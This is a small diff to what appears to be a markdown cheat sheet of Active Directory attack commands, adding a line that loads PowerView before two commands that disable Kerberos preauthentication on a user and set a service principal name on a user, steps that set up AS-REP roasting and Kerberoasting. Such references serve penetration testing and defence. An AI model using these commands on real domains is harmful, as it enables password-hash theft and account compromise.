@@ -829,6 +829,7 @@ Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<
 
 #### Set preauth not required
 ```
+. ./PowerView_dev.ps1
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
@@ -873,6 +874,7 @@ Get-NetUser | Where-Object {$_.servicePrincipalName}
 
 #### Set SPN for the user
 ```
+. ./PowerView_dev.ps1
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’ops/whatever1’}
 ```
 
